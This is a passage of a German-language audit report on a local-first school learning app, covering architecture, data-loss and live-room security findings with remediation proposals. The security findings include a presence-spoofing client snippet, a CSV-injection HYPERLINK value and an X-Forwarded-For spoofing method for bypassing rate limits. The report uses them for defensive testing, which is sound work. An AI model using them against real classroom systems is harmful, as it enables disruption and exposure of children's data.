- **Quelle:** `agent-a-architektur.md`

### A-011 – Monolithische Container, uneinheitliche Trennung von Ansicht und Ablauf, ad-hoc Daten- und Ereigniskopplung

- **Bereich:** Codequalität, Wartbarkeit
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Konzept:_ „Umfangreiche Screens trennen Zustand und Abläufe (Hook) von der Darstellung … etwa `app/raum/spiel/`.“ _Implementierung:_ Gerade `app/raum/spiel/live-game.tsx` ist das Gegenbeispiel. Die Dateigrößen liegen knapp unter der ESLint-Grenze von 1 000 Zeilen – die Grenze wirkt als Deckel, nicht als Anlass zur Zerlegung. Die Bestandstabelle in `docs/architecture.md` ist auf Dateiebene für `app/components` korrekt, erfasst aber die gemischten Module außerhalb davon nicht.
- **Belege:** `app/raum/spiel/live-game.tsx` (970 Zeilen, eine Komponente mit 25 `useState`, 10 `useEffect`, `submit` Zeilen 621-750 mit Speichern, Bewertung, Battle-Ladung und Fortschrittsmeldung); `app/frei/mathematics/mental-math-app.tsx` (902 Zeilen, 28 `useState`, eigenes Markup außerhalb `app/views`); `app/haus/house-app.tsx`, `app/frei/german/laufdiktat/running-dictation-app.tsx`, `app/lehrer/haeuser/teacher-houses.tsx` (eigenes Markup, nicht in der Bestandsliste von `docs/architecture.md`); … (vollständig in `agent-a-architektur.md`); Zählung `useState`/`useEffect`; Suche nach Containern mit ≥ 15 HTML-Elementen außerhalb `app/views`, `app/ui`, `app/components`.
- **Betroffene:** Entwicklung.
- **Folgen:** Schwer testbare Abläufe (Kopfrechnen-Container 68 % Zweige, Live-Spiel 74 %), Regressionsrisiko bei Änderungen am Unterrichtskern.
- **Empfehlung (Vorschlag zur Prüfung):** Zustandsautomaten der Abläufe (Runde, Antwort, Speichern) als reine Funktionen/Reducer in `src/` herauslösen, Container auf Verdrahtung reduzieren; eine Datenbankinstanz je Bereich als Modul-Singleton mit expliziter Subscription statt Fensterereignissen (z. B. Dexie `liveQuery`); Bestandstabelle um alle gemischten Module ergänzen.
- **Aufwand:** M
- **Erfolgskriterium:** Keine Komponente > 400 Zeilen mit mehr als 10 Zustandsvariablen; Abläufe von Live-Spiel und Kopfrechnen sind ohne DOM testbar.
- **Quelle:** `agent-a-architektur.md`

### A-012 – Datenwachstum und Projektionsaufwand: alles wird bei jeder Ansicht vollständig geladen und validiert

- **Bereich:** Performance, Datenhaltung
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (gemessen); Auswirkung auf Schul-iPads begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Keine Kompaktierung, Archivierung oder inkrementelle Projektion. Messung (P9): 6 000 Ereignisse pro Schuljahr ≈ 2,75 MB; einmalige Zod-Prüfung 44 ms, `dailyPlan.progress` 174 ms (fake-indexeddb) auf dem Arbeitsplatzrechner. Für ein Schuljahr unkritisch; linear wachsend und auf älteren iPads um ein Mehrfaches langsamer (nicht gemessen). Der Schüler-Handabgleich lädt jedes Mal die komplette Sicherung hoch.
- **Belege:** `src/storage/personal-learning-events.ts:86-153` (Index nur `id, learningObjectId, occurredAt, roundId`, kein Modul-/Quellindex); `app/lernen/use-learner-dashboard.ts:66-78` (Empfehlungen + Portion + Rohliste: 3–4 Vollscans, bis zu 3 vollständige Zod-Prüfungen je Aufruf); `src/storage/daily-plan.ts:186-238`; `app/components/learning-box-app.tsx:222-241` (jede LernBox-Aktion lädt Karten und Portion neu); `app/frei/mathematics/mental-math-app.tsx:186-189` (lädt alle Ereignisse aller Module für … (vollständig in `agent-a-architektur.md`); `repro-a/a-perf-year.test.ts`.
- **Betroffene:** Kinder mit mehrjähriger Nutzung, ältere Geräte.
- **Folgen:** Spürbare Wartezeiten beim Start nach mehreren Schuljahren; wachsende Sicherungs- und Cloud-Dateien.
- **Empfehlung (Vorschlag zur Prüfung):** Index `[learningArea+occurredAt]`; Ereignisse nur einmal je Ansicht laden und an alle Projektionen reichen; abgeschlossene Zeiträume zu Schnappschüssen verdichten (setzt A-003a voraus); Messung auf einem echten Schul-iPad.
- **Aufwand:** S–M
- **Erfolgskriterium:** Startseite mit 20 000 Ereignissen auf einem iPad der 6./7. Generation < 500 ms bis zur Anzeige.
- **Quelle:** `agent-a-architektur.md`

### A-013 – Uneinheitliche Validierung, doppelte Schemata und verstreute Datumslogik

- **Bereich:** Codequalität, Konsistenz
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** _Konzept:_ „Datumsarithmetik wird nicht verstreut selbst implementiert“; „alle externen oder gespeicherten Daten“ werden mit Zod geprüft. _Implementierung:_ beides nur teilweise. Aktive Tage auf der Fortschrittsseite (UTC) und auf der Startseite (lokal) können zwischen 0 und 2 Uhr voneinander abweichen.
- **Belege:** LernBox-Karten/-Stapel werden beim Lesen gar nicht validiert (`src/storage/personal-learning-events.ts:333-560`), Ereignisse streng (A-001); doppelte Schemata mit unterschiedlicher Strenge: `src/storage/progress-schema.ts:20-38` (ohne `.strict()`, entfernt Zusatzfelder) vs. `src/domain/personal-backup.ts:40-66` (`.strict()`); Tagesgrenzen: `src/domain/adaptive-learning.ts:39` (UTC-Tag `occurredAt.slice(0, 10)`) vs. `app/lernen/use-learner-dashboard.ts:80-82` (`localDayKey`); … (vollständig in `agent-a-architektur.md`); Suche nach `slice(0, 10)`, `86_400_000`, `DAY_MS`; Vergleich der Schemata.
- **Betroffene:** Entwicklung; geringfügig Kinder (Anzeige aktiver Tage).
- **Folgen:** Abweichende Zählungen, Pflegeaufwand bei Schemaänderungen (zwei Stellen).
- **Empfehlung (Vorschlag zur Prüfung):** Ein Zeitmodul (`local-day.ts` erweitern) für alle Tages- und Intervallrechnungen; ein Schema je Datensatz (strenges Schreib-, tolerantes Leseschema, siehe A-001); Karten beim Lesen prüfen.
- **Aufwand:** S–M
- **Erfolgskriterium:** Keine Literal-Tageslänge außerhalb des Zeitmoduls; ein Schema je gespeichertem Typ.
- **Quelle:** `agent-a-architektur.md`

### A-014 – Eingecheckte, veraltete Service-Worker-Dateien; Fingerabdruck mit Testdateien

- **Bereich:** Build, Auslieferung
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Der eingecheckte Fingerabdruck entspricht nicht dem Quellstand (`bff775c1f28b`). Da `prebuild` neu erzeugt, ist das ausgelieferte Artefakt korrekt – die eingecheckte Datei ist jedoch irreführend und erzeugt bei jedem lokalen `dev`/`build` Diffs. 178 von 622 gehashten Dateien sind Tests: Eine reine Teständerung löst bei allen Nutzern einen Update-Hinweis aus; eine reine Lockfile-Änderung dagegen nicht.
- **Belege:** `public/sw.js`, `public/version.json` (eingecheckt, `b5f357495db3`); `scripts/generate-service-worker.mjs:11-41` (hasht `app`, `src`, `worker` inkl. aller Testdateien, nicht aber `package-lock.json`, `public/`, `proxy.ts`).; P12 (`repro-a/fingerprint.mjs`).
- **Betroffene:** Entwicklung; Nutzer (unnötige Update-Hinweise).
- **Folgen:** Verwirrung, unnötige Aktualisierungsaufforderungen im Unterricht.
- **Empfehlung (Vorschlag zur Prüfung):** Generierte Dateien in `.gitignore`; Fingerabdruck aus dem gebauten `dist/client` (tatsächlich ausgelieferte Dateien) berechnen.
- **Aufwand:** S
- **Erfolgskriterium:** `git status` bleibt nach `npm run build` sauber; Teständerungen ändern den Fingerabdruck nicht.
- **Quelle:** `agent-a-architektur.md`

### A-015 – Demo-Pfad schreibt echte, nicht idempotente Lernereignisse

- **Bereich:** Datenhygiene, prototypische Pfade
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Wer die Vorschau auf einem Schülergerät einschaltet (z. B. Lehrkraft zum Vorführen), erzeugt über die Demo-Klasse echte Lernereignisse mit Zufalls-ID (Doppeltipp → Doppelereignis, entgegen „keine doppelten Ereignisse“). Fehler daraus landen als Portionselemente mit einer Route, die ohne Vorschau umgeleitet wird – solche Elemente sind dann nicht erledigbar. Produktionscode dient zugleich als Test-Fixture.
- **Belege:** `app/components/first-learning-round.tsx:175-215` (`storeResult`: `id: crypto.randomUUID()`, `practice.route: "/klasse/7b/aufgaben/vokabeln"`, `classContext.classId: "klasse-7b"`); `src/storage/daily-plan.ts:100-116` (Fehler-Ereignisse mit `practice` werden Portionselemente); `src/domain/release.ts:125-130` (Demo-Klasse `vorschau`, „Testgelände der Browser-Tests“); `proxy.ts:22-36` (Vorschau-Cookie 365 Tage).; Lesen der Fundstellen; nicht im Browser nachgestellt.
- **Betroffene:** Kinder auf Geräten mit aktivierter Vorschau.
- **Folgen:** Dauerhaft offene, unerledigbare Tagesportion; verfälschte Statistik.
- **Empfehlung (Vorschlag zur Prüfung):** Demo-Pfade in einen getrennten Datenbereich schreiben oder ohne Speicherung betreiben; Test-Fixtures nicht als Produktionsroute; Vorschau-Cookie befristen.
- **Aufwand:** S
- **Erfolgskriterium:** Demo-Nutzung verändert `lernraum:personal:v1` nicht.
- **Quelle:** `agent-a-architektur.md`

### A-016 – Benennung und Sprachmischung in persistierten Werten

- **Bereich:** Code-Konsistenz
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Englische Bezeichner, deutsche Kommentare sind konsistent; problematisch ist die Mischung in **gespeicherten** Werten und Routen, weil Umbenennungen dort Migrationen erzwingen.
- **Belege:** Routen `/frei/mathematics`, `/frei/german`, `/frei/typing` neben `/lernbox`, `/lernen`, `/raum`; gespeicherte Werte `"laufend"`/`"abgeschlossen"` (Textbox), `"eigen"`/`"unterricht"` (Wortboxen), `"richtig"`/`"gross-klein"` (Wortrunden) neben `"correct"`/`"not-assessed"` (Ereignisse), `"UEBUNG"`/`"BATTLE"`; zwei verschiedene Hooks `useContentLibrary` (`app/lehrer/use-content-library.ts`, `app/lehrer/live/hooks/use-content-library.ts`); Metadaten „Lernraum – Laufdiktat“/„Datensparsames … (vollständig in `agent-a-architektur.md`); Lesen der Schemata und Routen.
- **Betroffene:** Entwicklung.
- **Folgen:** Höherer Einarbeitungsaufwand, Fehler bei Vergleichen.
- **Empfehlung (Vorschlag zur Prüfung):** Konvention festschreiben (z. B. gespeicherte Werte englisch, UI-Texte deutsch); bei der nächsten Schema-Version vereinheitlichen; Metadaten aktualisieren; gleichnamige Hooks umbenennen.
- **Aufwand:** S (Konvention) / M (Migration)
- **Erfolgskriterium:** Konvention dokumentiert; neue Schemata halten sie ein.
- **Quelle:** `agent-a-architektur.md`

### A-017 – Wartbarkeit durch eine Einzelperson: Umfang und Änderungstempo übersteigen, was ohne KI-Agenten pflegbar ist

- **Bereich:** Wartbarkeit, Projektorganisation
- **Schwere:** P2
- **Evidenzstatus:** begründetes Risiko / offene Frage
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Codebasis wächst in einem Tempo, das eine einzelne Lehrkraft nur mit KI-Unterstützung halten kann. Das ist legitim, aber dann muss die Architektur besonders einfach und regelgesichert sein. Tatsächlich sind Randfunktionen (A-008) und doppelte Logik (A-004) entstanden, während die Kernverträge (A-001, A-003) fragil sind. Der Bus-Faktor ist 1; Schulträger können ohne Betriebs- und Übergabekonzept nicht auf den Weiterbetrieb vertrauen.
- **Belege:** Gesamtumfang ≈ 61 000 Zeilen Produktionscode (`app/` 38 836, `src/` 21 942) und ≈ 39 000 Zeilen Tests; im sichtbaren Zeitraum 180 Commits, davon 153 unter der Autorenkennung „Claude“; ≈ 20 Umsetzungspläne in `docs/`, 57 Entscheidungen im Vault.; `git log` (flacher Klon), Zeilenzählung.
- **Betroffene:** Schulen, die die Anwendung einsetzen; die Lehrkraft selbst.
- **Folgen:** Wissensverlust, steigende Kosten pro Änderung, Abhängigkeit von Agenten-Werkzeugen.
- **Empfehlung (Vorschlag zur Prüfung):** Umfang aktiv reduzieren (A-008), kurze Architekturentscheidungsdokumente (ADR) für die tragenden Entscheidungen (Datenmodell, Framework, Sync), „Kernverträge“ mit Änderungsprotokoll, ein Übergabe-/Betriebsdokument für Schulträger.
- **Aufwand:** M
- **Erfolgskriterium:** Eine fremde Entwicklerin kann mit `docs/` in einem Tag ein kleines Feature im Lernkern umsetzen; dokumentierter Betriebs- und Ausstiegsplan.
- **Quelle:** `agent-a-architektur.md`

### A-018 – Local-first ohne Persistenzanforderung: Daten der Kinder hängen am Browser-Speicher des Geräts

- **Bereich:** Datenhaltung (Schnittstelle zu B)
- **Schwere:** P2
- **Evidenzstatus:** begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Architektur macht den Browser-Speicher zur einzigen Quelle der Wahrheit. WebKit begrenzt laut eigener Aussage von 2020 skriptschreibbaren Speicher (IndexedDB u. a.) in Safari auf sieben Tage ohne Interaktion; für Home-Screen-Web-Apps gelte ein eigener Zähler bzw. eine Ausnahme. Quellen (nur Sekundärquellen erreichbar, aktuelles Verhalten **nicht online verifiziert**): [Search Engine Land: „What Safari’s 7-day cap on script-writeable storage means for PWA developers“](https://searchengineland.com/what-safaris-7-day-cap-on-script-writeable-storage-means-for-pwa-developers-332519), [WebKit Bugzilla 237350](https://bugs.webkit.org/show_bug.cgi?id=237350). Schul-iPads, die die Seite in Safari statt als installierte App nutzen, wären nach Ferien gefährdet.
- **Belege:** kein Aufruf von `navigator.storage.persist()` im gesamten Code (Suche in `app/`, `src/`); einzige Datenhaltung IndexedDB des Geräts; Sicherung nur manuell (Erinnerung in `src/storage/backup-reminder.ts`).; Codesuche; Verhalten auf echtem iPad nicht prüfbar (kein Gerät).
- **Betroffene:** Kinder auf Schul-iPads, besonders nach Ferien.
- **Folgen:** Vollständiger Verlust des Lernstands ohne Warnung.
- **Empfehlung (Vorschlag zur Prüfung):** `navigator.storage.persist()` anfordern und Ergebnis anzeigen; Installation als Home-Screen-App für Schulgeräte verbindlich machen und prüfen (`display-mode: standalone`); automatische lokale Sicherung bzw. Sicherung über den Klassen-Rückweg. Detailprüfung durch B.
- **Aufwand:** S
- **Erfolgskriterium:** Die App zeigt den Persistenzstatus; Testprotokoll eines Schul-iPads nach 14 Tagen Nichtnutzung. ---
- **Quelle:** `agent-a-architektur.md`

## B – Sicherheit, Datenschutz, Offline

### B-001 – Persönliche Sicherung bricht ab, sobald ein LernBox-Stapel in einem Ordner liegt

- **Bereich:** Datenintegrität / Sicherung (Schülergerät)
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** bestätigt (Hauptinstanz reproduziert, F Codelesung): alle drei Sicherungswege fallen aus. Präzisierung (F, Teil 2.10): sichtbare Meldung, aber ohne Ursache und Abhilfe für das Kind.
- **Beschreibung:** Seit es LernBox-Ordner gibt (Dexie v4, `learningBoxFolders`, UI in `app/views/lernbox/parts/manage.tsx` und `new-deck.tsx`), trägt ein Stapel im Ordner das Feld `folderId`. Das strikte Sicherungsschema kennt es nicht. **Jeder** Sicherungsweg (Datei, Verzeichnis, Schüler-Cloud) scheitert dann vollständig. Die Oberfläche meldet nur „Die Sicherung konnte nicht erstellt werden.“ Selbst wenn man `folderId` erlaubte, fehlt die Tabelle `learningBoxFolders` im Sicherungsumfang. Nach einer Wiederherstellung hätten die Stapel eine `folderId` ohne Ordner. Die Startseite zeigt nur Stapel ohne `folderId` oder solche in vorhandenen Ordnern (`home.tsx:17, 102-111`), solche Stapel wären also unsichtbar. Der getrennte LernBox-Export (`exportBackup`, `personal-learning-events.ts:528-532`) enthält Ordner, ist aber nicht die beworbene „Lernstand sichern“-Funktion.
- **Belege:** `src/domain/personal-backup.ts:67-77` (`personalBackupDeckSchema`, `.strict()` ohne `folderId`), `src/storage/personal-backup.ts:103-126` (`exportPersonalLearningBackup`, `serializePersonalLearningBackupFromDatabase`); Aufrufer `app/components/student-settings-panel.tsx:211-232` (`download`), `src/integrations/backup/personal-backup-storage.ts:68` (Verzeichnis), `src/integrations/cloud-sync/sync.ts:20` (Schüler-Cloud „sichern“); `repro-b/backup-folders.test.ts`: Ordner anlegen → Stapel mit `folderId` → `serializePersonalLearningBackupFromDatabase` → `ZodError [unrecognized_keys: folderId] at data.learningBoxDecks[0]`. Keine Testdatei im Repo deckt Ordner in der Sicherung ab (`grep folder` in Backup-Tests: kein Treffer).
- **Betroffene:** alle Kinder, die Ordner nutzen (z. B. „Buch Klasse 5“); damit auch deren Eltern/Lehrkräfte bei Gerätewechsel.
- **Folgen:** Die einzige Absicherung gegen Speicherlöschung (siehe B-002) fällt still aus. Ein Kind sieht nur eine Fehlermeldung, die Erinnerung bleibt auf „nie gesichert“ oder veraltet, der gesamte Lernstand geht beim nächsten iPad-Reset verloren.
- **Empfehlung (Vorschlag zur Prüfung):** `folderId` und `learningBoxFolders` in Schema und Export aufnehmen (abwärtskompatibel mit `.default([])`). Wiederherstellung: verwaiste `folderId` entfernen. Einen Eigenschaftstest (fast-check) ergänzen, der beliebige gültige Repository-Zustände exportiert und wieder einliest („jede Tabelle der Dexie-Version ist im Export enthalten oder ausdrücklich ausgenommen“). Die Fehlermeldung sollte den Grund nennen.
- **Aufwand:** S
- **Erfolgskriterium:** Round-Trip-Test mit Ordnern grün; ein Strukturtest scheitert, sobald eine neue Dexie-Tabelle oder ein neues Feld nicht im Sicherungsschema auftaucht.
- **Quelle:** `agent-b-sicherheit.md`

### B-002 – Keine Antwort auf Speicherlöschung unter iPadOS/Safari; Sicherungserinnerung ist rein passiv

- **Bereich:** Zuverlässigkeit / Datenverlust
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (Codeanalyse) für das Fehlen von Maßnahmen; begründetes Risiko für das Plattformverhalten
- **Gegenprüfung:** bestätigt (F): Fehlen der Maßnahmen belegt; Plattformteil teilweise überzeichnet (7-Tage-Regel zählt Safari-Nutzungstage, Home-Bildschirm-Apps eigener Zähler). „Kanarienvogel“ erkennt keine Vollöschung. Empfehlung angepasst: „Speicher-Kanarienvogel“ erkennt keine Vollöschung – stattdessen auf leerem Gerät „Sicherung einspielen“ anbieten; schulseitige Sicherung nicht ohne Datenschutzkonzept (Roadmap S3).
- **Beschreibung:** Alle Lernstände liegen in IndexedDB/localStorage. Diese Speicher können auf mehreren Wegen verschwinden, und keiner davon wird im Code oder in der Doku behandelt: 1. **WebKit-7-Tage-Regel (ITP):** Bei nicht installierten Websites löscht Safari nach 7 Tagen Safari-Nutzung ohne Interaktion mit der Website den gesamten skriptbeschreibbaren Speicher (IndexedDB, LocalStorage, SW-Caches). Home-Bildschirm-Apps haben einen eigenen Zähler, der praktisch nicht abläuft. Ferien von 2+ Wochen bei weiter genutztem Safari reichen also aus. 2. **Getrennte Speicher:** Eine zum Home-Bildschirm hinzugefügte Web-App hat unter iOS einen anderen Speichercontainer als Safari. Wer erst in Safari lernt und dann „Als App installieren“ folgt, startet mit leerem Lernraum. Die Installationsanleitung sagt das nicht. 3. **Speicherdruck:** Ohne `persist()` darf der Browser die Origin bei Platzmangel räumen. 4. … (vollständig in `agent-b-sicherheit.md`)
- **Belege:** fehlend im gesamten Code: `navigator.storage.persist()`, `persisted()`, `estimate()` (Suche ohne Treffer); `src/storage/backup-reminder.ts:1-44`; Anzeige nur in `app/components/student-settings-panel.tsx:296-303`; Installationshilfe `app/landing/install-button.tsx:8-27`; Codesuche (`grep -rn "storage.persist\|persisted()\|navigator.storage"` → leer). Doku-Suche nach ITP/7 Tage/Home-Bildschirm-Speicher → nur Spiegelschrift-Treffer. Plattformverhalten: Literatur (Quellen unten), nicht auf echtem iPad nachgestellt.
- **Betroffene:** alle Kinder, besonders auf iPads in Safari (nicht installiert), auf geteilten/verwalteten Geräten und nach Ferien.
- **Folgen:** Kompletter Verlust von Lernhistorie, Leitner-Ständen, Wortspeicher und Klassenmitgliedschaft (inkl. LRS-Freigabe). Lernstand und Motivation des Kindes sind dann weg, und die adaptive Wiederholung verliert ihre Grundlage.
- **Empfehlung (Vorschlag zur Prüfung):** (1) `navigator.storage.persist()` nach erster Lernaktivität anfordern, Ergebnis und `estimate()` anzeigen. (2) Beim Start einen „Speicher-Kanarienvogel“ prüfen: Ist eine Kennung weg, die vorher da war, ist der Speicher gelöscht worden. Dann eine erklärende Seite mit Wiederherstellung zeigen. (3) Unter iPadOS ausdrücklich die Home-Bildschirm-Installation **vor** dem ersten Lernen empfehlen und auf die getrennten Speicher hinweisen. (4) Die Erinnerung aktiv auf der Lernen-Startseite zeigen. (5) Mittelfristig eine schulseitige Sicherung ohne Kinderkonto anbieten, z. B. einen QR-/Dateiexport, den die Lehrkraft einsammelt (datenschutzrechtlich prüfen). (6) Die Doku `device-support.md` um ein Kapitel „Speicherlebensdauer“ ergänzen.
- **Aufwand:** M
- **Erfolgskriterium:** Auf einem echten iPad (Safari und Home-Bildschirm) belegt ein Testprotokoll: `persisted()` ist `true` oder es gibt einen Hinweis, gelöschter Speicher wird erkannt, die Installationsanleitung warnt vor dem Speicherwechsel.
- **Quelle:** `agent-b-sicherheit.md`

### B-003 – Realtime-Kanäle ohne Autorisierung: Präsenz fälschen, Angriffe senden, mithören

- **Bereich:** Sicherheit Live-Raum (Supabase Realtime)
- **Schwere:** P2 (Prüfinstanz: P1)
- **Evidenzstatus:** bestätigt (Codeanalyse); nicht gegen Produktion ausgeführt (verboten)
- **Gegenprüfung:** abgeschwächt (F): P2 im Grundschulpilot auf verwalteten iPads, P1 vor Sek-I-Einsatz oder Rollout. Verschärfung: realistischer Angreifer ist ein Kind im Raum (frei wählbarer Absendertext im Battle).
- **Beschreibung:** Das Kanalthema hängt nur am vierstelligen Code. Der Publishable Key steht im ausgelieferten Bundle. Laut Supabase-Doku braucht Autorisierung private Kanäle (`private: true`), RLS-Policies auf `realtime.messages` und das Abschalten von „Allow public access“. Nichts davon ist umgesetzt, die App _muss_ daher mit öffentlichem Zugang laufen. Ein Fremder braucht weder `join_room_secure` noch Rate-Limit noch das 90-Minuten-Fenster. Er kann: 1. **Präsenz fälschen:** Beliebige Schlüssel (auch Beleidigungen) erscheinen in der Teilnehmerliste der Lehrkraft, oft am Beamer, als „online“. Sie landen in der Ergebnis-CSV (siehe B-007). „Entfernen“ wirkt nur auf DB-Teilnehmer, gegen reine Präsenz-Einträge hilft es nicht. 2. **Battle stören:** `attack` an jedes Kind senden (Tinte/Flimmern je 15 s). Die Zielnamen (`participant-…`) liest er aus den öffentlichen `student-progress`-Broadcasts mit. 3. … (vollständig in `agent-b-sicherheit.md`)
- **Belege:** `app/components/live-room-join.tsx:177-179` (öffentlicher Kanal `room-${code}`, kein `private: true`), `:285-294`, `:303-336` (`student-progress`/`student-finished` ungeprüft in `roster`/`peers`), `:337-347` (`request-progress`), `:348-367` (`attack` ungeprüft), `:496-512` (Broadcast enthält `...progress` inkl. `wordErrors`), `:530-546` (`sendAttack`); `app/lehrer/live/hooks/use-live-room-session.ts:297-323` (Präsenzschlüssel → `presenceNames`), `:361-368` (`connectedNames`/`allNames` … (vollständig in `agent-b-sicherheit.md`); Codepfad oben. Prüfweg für die Hauptinstanz in einer Testumgebung (nicht Produktion): zweiter Client mit `createClient(url, key).channel("room-1234", {config:{presence:{key:"TEST"}}}).subscribe(s => s==="SUBSCRIBED" && ch.track({}))` → Name erscheint im Lehrer-Dashboard. Supabase-Doku zur Realtime-Autorisierung (Quellen unten).
- **Betroffene:** Lehrkräfte (Beamer-Anzeige, CSV), alle Kinder im Raum (Störungen, Mitlesen von Fehlern).
- **Folgen:** Störung des Unterrichts ohne Zurechenbarkeit, Bloßstellung durch eingeschleuste Namen vor der Klasse, Mitlesen pseudonymer Leistungsdaten, verfälschte Ergebnislisten. Ein neugieriger Mittelschüler mit der Browser-Konsole reicht dafür.
- **Empfehlung (Vorschlag zur Prüfung):** Private Kanäle mit RLS auf `realtime.messages`. Da es keine Supabase-Auth gibt: (a) anonyme Supabase-Auth-Sitzungen, deren Teilnahme `join_room_secure` in einer Tabelle bindet, und eine Policy, die Thema und Raum-ID gegen diese Tabelle prüft; oder (b) Realtime nur noch als inhaltsleeres Wecksignal nutzen, mit nicht erratbarem Thema (Raum-UUID statt Code), und alles Weitere per RPC. Präsenz für die Lehreransicht nur aus `room_participants` ableiten (`touch_participant_secure` existiert schon), Präsenzschlüssel nie anzeigen oder exportieren. `attack` nur annehmen, wenn `from` ein bekannter Teilnehmer ist, und Angriffe serverseitig (RPC) vermitteln. Broadcasts ohne `wordErrors`.
- **Aufwand:** M (Variante b) bis L (Variante a)
- **Erfolgskriterium:** Ein Client ohne gültigen Teilnehmertoken kann den Raumkanal nicht abonnieren (Testumgebung). Die Lehrerliste zeigt nur serverseitig registrierte Teilnehmer. Ein E2E-Test mit gefälschtem Präsenzclient bleibt ohne Wirkung.
- **Quelle:** `agent-b-sicherheit.md`

### B-004 – Vierstelliger Raumcode als einzige Schranke: Lösungen lesen, Stationsstände überschreiben

- **Bereich:** Sicherheit Live-Raum (RPC)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, PGlite mit Originalmigrationen)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Wer den Code kennt (projiziert, im Link `/raum?code=…`, in Chat-Screenshots), tritt bis 90 min nach Öffnung bei. Mit Teilnehmertoken kann er: (a) alle Aufgaben **mit Lösungen** lesen (Mathe-Ergebnisse, Vokabelübersetzungen, Diktatwörter), auch im Modus, den Vault 02/08 „Lernstandscheck“ nennt; (b) im Stationsmodus jede Station lesen und mit beliebigen Werten überschreiben (`finished`, `errors`, `word_errors` bis 64 KB mit beliebigen Schlüsseln); (c) als Teilnehmer in der Lehrerliste erscheinen. Das Raten aller 10 000 Codes von einer Adresse dauert wegen 600 Beitritten pro 10 min etwa 2,8 h, also länger als das Fenster. Mit B-005 (Header-Fälschung) oder mehreren Adressen geht es schneller, über Realtime (B-003) ganz ohne Limit. Positiv: Tokens werden gehasht, Raumtoken mit 128 bit, Wiedereintritt raumgebunden, Löschung nach 24 h, keine Klarnamen.
- **Belege:** `supabase/migrations/20261003120000_room_time_limits.sql:6-110` (`join_room_secure`: Code reicht, Fenster 90 min), `20260920120000_room_identity_contract.sql:185-205` (`get_room_state_secure` liefert `config` inkl. aller `targetWord`), `20260825124001_migrate_laufdiktat_live_rooms.sql:138-156` (`upsert_progress_secure`: in Stationsmodus darf **jeder** Teilnehmer jede Station schreiben, `where room_students.station_number is not null`), `20260908165538_repair_room_contracts.sql:77-86` … (vollständig in `agent-b-sicherheit.md`); `repro-b/db-abuse.test.mjs`, Test 2 → `strangerSeesSolutions:["56","Rhythmus"]`, Lehrkraft-RPC zeigt Station 2 mit `errors:99, finished:true, word_errors:{"=HYPERLINK(\"http://x\")":5}`.
- **Betroffene:** Lehrkräfte (verfälschte Ergebnisse), Kinder (Stationsfortschritt überschrieben).
- **Folgen:** Wertlose Lernstandschecks, Sabotage im Stationsbetrieb, CSV-Injektion (B-007).
- **Empfehlung (Vorschlag zur Prüfung):** Antworten nicht an Clients ausliefern, wenn der Modus bewertend ist: serverseitige Prüfung per RPC oder Hash plus Salt pro Wort, wohl wissend, dass Hashes bei kleinen Antwortmengen ratbar sind. Stationen an Teilnehmer binden (erste Belegung gewinnt, Wechsel nur durch die Lehrkraft). `word_errors`-Schlüssel serverseitig gegen die Wörter der Raumkonfiguration prüfen. Option „Lobby schließen“ (keine neuen Beitritte nach Start). Länger als 4 Ziffern oder zusätzliche Bestätigung neuer Teilnehmer durch die Lehrkraft erwägen.
- **Aufwand:** M
- **Erfolgskriterium:** DB-Vertragstest: Ein zweiter Teilnehmer kann eine belegte Station nicht überschreiben. `word_errors` mit fremden Schlüsseln wird abgewiesen. Im bewertenden Modus enthält `get_room_state_secure` keine Lösungen.
- **Quelle:** `agent-b-sicherheit.md`

### B-005 – Rate-Limit vertraut dem linken `X-Forwarded-For`-Eintrag; Schul-NAT teilt einen Topf

- **Bereich:** Sicherheit / Verfügbarkeit Supabase
- **Schwere:** P2
- **Evidenzstatus:** DB-seitig bestätigt (reproduziert); Ausnutzbarkeit in Produktion begründetes Risiko / offene Frage
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Der Schlüssel ist der **linke** Eintrag. Laut Cloudflare-Doku wird ein vom Client mitgesendetes `X-Forwarded-For` **ergänzt, nicht ersetzt**; der linke Eintrag ist dann frei wählbar. Ob das Supabase-Gateway den Header vorher überschreibt, ist ungeprüft. Das Risikoregister nennt diese Prüfung selbst als offen. Trifft das Ergänzen zu, sind alle Limits (Raum öffnen 12/10 min, Beitritt 600/10 min) wirkungslos. Umgekehrt teilen sich alle Geräte hinter einem Schul-NAT einen Topf. Ein Kind, das im Schulnetz Codes rät, sperrt damit Beitritte für die ganze Schule. Mehr als 12 Raumöffnungen in 10 min sind pro Schule nicht möglich. Der gespeicherte Schlüssel ist ein ungesalzener SHA-256 der IP, für IPv4 per Durchprobieren umkehrbar.
- **Belege:** `supabase/migrations/20260825124001_migrate_laufdiktat_live_rooms.sql:67-71` (`private.request_key_hash`: `split_part(x-forwarded-for, ',', 1)`, Fallback `'unknown'`), `20260908165538_repair_room_contracts.sql:3-11` (`enforce_rate_limit`); `repro-b/db-abuse.test.mjs`, Test 1 → `{"openRoomSameIp":12,"blockedAt13":true,"openRoomWithSpoofedLeftXff":40,"noHeaderSharedBucketBlockedAt13":true}`. Produktionsprüfung (Hauptinstanz/Betreiber, Testprojekt): Request mit `X-Forwarded-For: 10.0.0.1` senden und `current_setting('request.headers')` protokollieren.
